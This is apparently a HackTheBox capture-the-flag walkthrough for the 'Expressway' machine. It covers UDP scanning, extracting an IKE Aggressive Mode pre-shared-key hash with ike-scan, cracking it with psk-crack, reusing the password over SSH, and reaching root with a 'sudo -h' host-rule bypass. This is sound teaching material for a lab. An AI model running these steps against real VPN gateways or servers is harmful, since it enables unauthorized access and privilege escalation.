---


---

<h1 id="expressway-machine-hackthebox">Expressway Machine HackTheBox</h1>
<h2 id="introduction">Introduction</h2>
<p>Expressway Machine is a beginner-friendly machine, where you will test your skills against a machine, with concepts that we normally overlook when attacking a CTF or doing a security audit</p>
<h3 id="what-you-will-learn">What you will learn</h3>
<ul>
<li><strong>UDP Port enumeration:</strong> The importance of scanning UDP ports</li>
<li><strong>IKE/IPsec Testing:</strong> Using ike-scan to identify Aggressive Mode vulnerabilities</li>
<li><strong>PSK Cracking</strong>: Extracting and cracking IKE pre-shared keys with psk-crack</li>
<li><strong>Credential Reuse</strong>: How VPN credentials can provide SSH access</li>
</ul>
<h2 id="step-1">Step 1</h2>
<p>We do a normal nmap with the next flags:</p>
<pre class=" language-bash"><code class="prism  language-bash">nmap --min-rate 5000 -p- -n -Pn -sS 10.10.11.87 --open
</code></pre>
<ul>
<li><strong>--min-rate 5000:</strong> This flag tells nmap to send a minimum of 5000 packets per second</li>
<li><strong>-p-:</strong> Scans the 65535 existent ports</li>
<li><strong>-n:</strong>  It prevents from DNS resolving</li>
<li><strong>-Pn:</strong> Disable host discovery scanning (ping)</li>
<li><strong>-sS:</strong> Prevent from doing three-way handshake</li>
<li><strong>10.10.11.87:</strong> The IP address that we want to scan</li>
<li><strong>--open:</strong> List only open ports</li>
</ul>
<blockquote>
<p>Three-way handshake is the standard  connection process:</p>
<ol>
<li><strong>Client</strong> → SYN → Server</li>
<li><strong>Server</strong> → SYN-ACK → Client</li>
<li><strong>Client</strong> → ACK → Server</li>
</ol>
<p><strong>nmap -sS (SYN Scan)</strong>:</p>
<ul>
<li>Sends SYN packet (step 1)</li>
<li>Receives SYN-ACK (step 2)</li>
<li><strong>Does NOT send final ACK</strong> (step 3) - hence “half-open” scan</li>
<li>This makes the scan stealthier as no full connection is established</li>
</ul>
</blockquote>
<hr>
<p>So, we see the port 22 is open, for the service SSH, we will do a more exhaustive scan for this port:</p>
<pre class=" language-bash"><code class="prism  language-bash">nmap --script ssh-auth-methods -sV -p 22 --min-rate 5000 10.10.11.87
</code></pre>
<ul>
<li><strong>--script ssh-auth-methods:</strong> Is a script for nmap that show to us the ways of autenticate in the server by SSH protocol.</li>
<li><strong>-sV:</strong> This flag makes nmap list the versions of the services running on the port and tell us which version they are using</li>
<li><strong>-p 22:</strong> We specify what port we want to scan, in this case only the 22 because is the only  port open</li>
</ul>
<p>The scan report we can connect via publickey or a password.</p>
<p>In fact we have not find any TCP port except 22 open, we will scan UDP ports, with the flag -sU</p>
<pre class=" language-bash"><code class="prism  language-bash">nmap -sU --min-rate 5000 --top-ports 100 10.10.11.87
</code></pre>
<p><strong>--top-ports 100:</strong> This flag scans the 100 more popular ports<br>

We receive a very, very interesting report:</p>
<pre class=" language-bash"><code class="prism  language-bash">PORT      STATE  SERVICE
500/udp   <span class="token function">open</span>   isakmp
593/udp   closed http-rpc-epmap
1645/udp  closed radius
3283/udp  closed netassistant
4444/udp  closed krb524
17185/udp closed wdbrpc

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.56 seconds
</code></pre>
<p>We see the port 500 is open! Also, is the number in the logo of the machine.</p>
<h2 id="step-2">Step 2</h2>
<p>Once we’ve completed the reconnaissance, it’s time to begin the exploitation phase. How can we do this?</p>
<p>Well, it’s easier than it seems. UDP port 500 is used by the ISAKMP/IKE protocol for the initial setup of IPsec VPN connections. This protocol has a mode called “Aggressive Mode” which, when enabled, allows you to extract a hash of the pre-shared key (PSK) to perform an offline attack. This key is often reused in other services like SSH, turning a vulnerable VPN configuration into an entry point into the system.</p>
<h3 id="ike-scan">ike-scan</h3>
<p>For this type of vulnerability, it is typical to use ike-scan, which is a reconnaissance and fingerprinting tool for VPN services that use IPsec with IKE.<br>
So, we use the next command:</p>
<pre class=" language-bash"><code class="prism  language-bash">ike-scan -A expressway.htb
</code></pre>
<ul>
<li><strong>-A:</strong> Is a flag to indicate agressive mode</li>
<li><strong>expressway.htb:</strong> The VPN we want to scan</li>
</ul>
<blockquote>
<p>In HTB it is quite common for machines to use domain names in this format: “{MACHINE_NAME}.htb”, probably when you try to do an ike-scan, it wont works because your machine doesn´t know what “expressway.htb” means, so, you have to do a sudo nano /etc/hosts and add this line “10.10.11.87 expressway.htb” at the end of the file.</p>
</blockquote>
<p>We get the next answer from the scan:</p>
<pre class=" language-bash"><code class="prism  language-bash">Starting ike-scan 1.9.6 with 1 hosts <span class="token punctuation">(</span>http://www.nta-monitor.com/tools/ike-scan/<span class="token punctuation">)</span>
10.10.11.87     Aggressive Mode Handshake returned HDR<span class="token operator">=</span><span class="token punctuation">(</span>CKY-R<span class="token operator">=</span>11a5b3a86f65910b<span class="token punctuation">)</span> SA<span class="token operator">=</span><span class="token punctuation">(</span>Enc<span class="token operator">=</span>3DES Hash<span class="token operator">=</span>SHA1 Group<span class="token operator">=</span>2:modp1024 Auth<span class="token operator">=</span>PSK LifeType<span class="token operator">=</span>Seconds LifeDuration<span class="token operator">=</span>28800<span class="token punctuation">)</span> KeyExchange<span class="token punctuation">(</span>128 bytes<span class="token punctuation">)</span> Nonce<span class="token punctuation">(</span>32 bytes<span class="token punctuation">)</span> ID<span class="token punctuation">(</span>Type<span class="token operator">=</span>ID_USER_FQDN, Value<span class="token operator">=</span>ike@expressway.htb<span class="token punctuation">)</span> VID<span class="token operator">=</span>09002689dfd6b712 <span class="token punctuation">(</span>XAUTH<span class="token punctuation">)</span> VID<span class="token operator">=</span>afcad71368a1f1c96b8696fc77570100 <span class="token punctuation">(</span>Dead Peer Detection v1.0<span class="token punctuation">)</span> Hash<span class="token punctuation">(</span>20 bytes<span class="token punctuation">)</span>

Ending ike-scan 1.9.6: 1 hosts scanned <span class="token keyword">in</span> 0.072 seconds <span class="token punctuation">(</span>13.86 hosts/sec<span class="token punctuation">)</span>.  1 returned handshake<span class="token punctuation">;</span> 0 returned notify
</code></pre>
<p>At first view, this is nothing, but we got something that is invaluable, the User ID:<br>
“ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)”, with this, we can try to get some hash, so let try with this new value</p>
<pre class=" language-bash"><code class="prism  language-bash">ike-scan -A expressway.htb --id<span class="token operator">=</span>ike@expressway.htb -P
</code></pre>
<ul>
<li><strong>-P:</strong> This new flag is used for an agressive crack mode of pre-shared keys.</li>
</ul>
<p>After we do this scan, we get a long hash, so, we save it in a file called ike.psk and crack it with psk-crack using the dictionary “rockyou.txt”</p>
<pre class=" language-bash"><code class="prism  language-bash">psk-crack -d /YOUR/PATH/rockyou.txt ike.psk
</code></pre>
<p>If we remember, in the reconnaissance phase we saw that SSH on port 22 allowed password authentication, so let’s try to connect by SSH:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ssh</span> ike@expressway.htb
ike@expressway.htb's password:
</code></pre>
<p>Then, we use the password that we have just cracked, and, we get access as ike, how we can check who we are? Easy:</p>
<pre class=" language-bash"><code class="prism  language-bash">ike@expressway:~$ <span class="token function">whoami</span>
ike
</code></pre>
<p>Nice! We got a user level bash on the machine, we can confirm that we are in the machine if we do an ifconfig and confirm that the IP address is the same as the objective, confirming that we are not in a docker</p>
<pre class=" language-bash"><code class="prism  language-bash">ip address
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
inet 10.10.11.87/23 brd 10.10.11.255 scope global eth0
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
</code></pre>
<p>So yes, we are at the objective machine, let´s try a basic ls -la</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ls</span> -la
user.txt
<span class="token function">cat</span> user.txt
45d35<span class="token punctuation">..</span>.
</code></pre>
<p>Nice! We get the user flag, now go for a privilege escalation</p>
<h2 id="step-3">Step 3</h2>
<p>Once we get access, we want get root, so, lets try for an sudo -l</p>
<pre class=" language-bash"><code class="prism  language-bash">ike@expressway:~$ <span class="token function">sudo</span> -l
Password:
Sorry, try again.
</code></pre>
<p>We have valuable information here, we can use sudo but we dont have password, lets try to search in /etc/sudoers valuable information.</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">cat</span> /etc/sudoers
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
<span class="token comment"># Host alias specification</span>
Host_Alias     SERVERS        <span class="token operator">=</span> expressway.htb, offramp.expressway.htb
Host_Alias     PROD           <span class="token operator">=</span> expressway.htb
ike            SERVERS, <span class="token operator">!</span>PROD <span class="token operator">=</span> NOPASSWD:ALL
ike         offramp.expressway.htb  <span class="token operator">=</span> NOPASSWD:ALL
</code></pre>
<blockquote>
<p>The configuration in <code>/etc/sudoers</code> means:</p>
<ul>
<li><code>ike SERVERS, !PROD = NOPASSWD:ALL</code>: User ‘ike’ can execute any command without a password on SERVERS except on PROD</li>
<li><code>ike oframp.expressway.htb = NOPASSWD:ALL</code>: Full access without a password specifically for the hostname ‘offramp.expressway.htb’</li>
</ul>
</blockquote>
<p>Good, this mean if we use sudo with the host of “offramp.expressway.htb” we don’t need password, so lets try this:</p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sudo</span> -h offramp.expressway.htb <span class="token function">bash</span>
</code></pre>
<ul>
<li><strong>-h:</strong> Used to indicate the host we want to use, previously seen in sudoers</li>
<li><strong>bash:</strong> The command we want to do, in this case, generate a sudo bash (root bash)<br>

Now, how you can notice, we are root! We have fully pawned this machine, one last thing:</li>
</ul>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">cat</span> /root/root.txt
b3f51<span class="token punctuation">..</span>.
</code></pre>
<p>Now, put both flags on HTB web and you will complete the expressway machine.</p>

